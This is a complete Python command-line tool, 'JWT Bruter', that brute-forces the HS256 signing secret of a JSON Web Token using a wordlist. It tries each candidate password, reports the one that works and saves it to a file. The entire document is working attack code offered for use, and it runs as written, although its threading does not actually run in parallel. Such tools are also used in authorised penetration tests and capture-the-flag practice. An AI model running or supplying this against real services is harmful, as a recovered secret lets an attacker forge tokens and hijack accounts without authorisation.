#!/bin/env python3
import jwt
import time
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
import psutil
import sys

Red = Fore.RED
Green = Fore.GREEN
Cyan = Fore.CYAN
Blue = Fore.BLUE
Bold = Style.BRIGHT
Reset = Style.RESET_ALL

def brute_force_jwt(encoded, password):
    try:
        payload = jwt.decode(encoded, password, algorithms=['HS256'])
        return password
    except jwt.InvalidKeyError:
        pass
    except jwt.ExpiredSignatureError:
        pass
    except Exception as e:
        pass
    return None

def get_num_threads():
    cpu_usage = psutil.cpu_percent()
    if cpu_usage < 60:
        return 8
    elif cpu_usage < 80:
        return 4
    else:
        return 2

def load_passwords(password_list):
    try:
        with open(password_list, 'rb') as file:
            return [line.strip().decode('latin-1') for line in file]
    except FileNotFoundError:
        print(f"[{Red}{Bold}ERR{Reset}] Password list file not found, Exiting.")
        sys.exit(1)
    except Exception as e:
        print(f"[{Red}{Bold}ERR{Reset}] An error occurred while loading passwords: {str(e)}" )
        sys.exit(1)
def save_found_password(success, output_file):
    with open(output_file, 'a') as file:
        file.write(success + '\n')

def main():
    banner = """
    ╔╦╗╔═╗╔╦╗ ╦╦ ╦╔╦╗
     ║║║╣  ║║ ║║║║ ║
    ═╩╝╚═╝═╩╝╚╝╚╩╝ ╩ v1.2
    JWT Bruter by Asbawy
    """
    print(f"{Red}{banner}{Reset}")
    encoded = input(f"{Blue}[+]{Reset} Enter JWT token: ")

    try:
        jwt.decode(encoded, options={'verify_signature': False})
    except jwt.InvalidTokenError:
        print(f"[{Red}{Bold}ERR{Reset}] Invalid JWT token, Exiting.")
        sys.exit(1)

    password_list = input(f"{Blue}[+]{Reset} Enter the passwords list: ")
    output_file = input(f"{Blue}[+]{Reset} Enter the output file for found passwords (optional): ")

    passwords = load_passwords(password_list)
    print(f"[{Cyan}{Bold}INFO{Reset}] Starting brute force with {Green}{len(passwords)} passwords{Reset}.")
    start_time = time.time()
    success = None

    with ThreadPoolExecutor(max_workers=get_num_threads()) as executor:
        passwords_tested = 0
        for secret in passwords:
            result = executor.submit(brute_force_jwt, encoded, secret)
            passwords_tested += 1
            if result.result():
                success = result.result()
                if output_file:
                    save_found_password(success, output_file)
                break
            sys.stdout.write(f"\r[{Cyan}{Bold}INFO{Reset}] Passwords tested: {Green}{passwords_tested}{Reset}")
            sys.stdout.flush()

    if success:
        print(f"\n[{Green}DONE{Reset}] Token decoded with the following password: [{Green}{Bold}{success}{Reset}]")
    else:
        print(f"\n[{Red}{Bold}ERR{Reset}] Failed to decode token.")

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"[{Cyan}INFO{Reset}] Elapsed time: {Bold}{Cyan}{elapsed_time:.2f} seconds{Reset}")

if __name__ == "__main__":
    main()
